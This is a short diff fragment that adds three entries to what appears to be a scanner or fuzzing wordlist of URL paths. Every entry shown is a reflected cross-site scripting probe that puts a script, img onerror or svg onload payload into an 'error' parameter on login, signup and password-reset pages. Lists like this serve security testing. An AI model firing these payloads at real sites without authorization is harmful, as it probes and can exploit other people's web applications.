@@ -159,3 +159,6 @@
 /Forms/rpAuth_1?id=</form><iMg%20src=x%20onerror=
 /?page</script><script>alert(document.domain)</script>
 /
+/web/login?error=<script>alert(document.domain)</script>
+/web/signup?error=<img/src=x+onerror=alert(document.domain)>
+/web/reset_password?error=<svg/onload=alert(document.domain)>
